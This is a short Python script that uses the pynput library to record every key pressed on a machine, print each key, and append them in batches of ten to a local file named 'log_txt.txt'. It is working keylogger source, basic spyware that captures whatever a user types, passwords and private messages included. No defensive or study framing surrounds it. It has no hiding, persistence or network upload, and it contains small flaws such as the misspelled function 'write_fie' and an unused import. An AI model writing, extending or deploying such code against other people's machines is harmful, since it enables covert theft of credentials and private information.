import pynput
import keyboard
from pynput.keyboard import Key, Listener


count = 0
keys = []


def on_press(key):
	global  keys, count

	keys.append(key)
	count += 1
	print("{0} pressed".format(key))

	if count >= 10:
		count = 0
		write_fie(keys)
		keys = []
def write_fie(keys):
	with open("log_txt.txt", "a") as f:
		for key in keys:
			f.write(str(key))

def on_release(key):
	pass

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
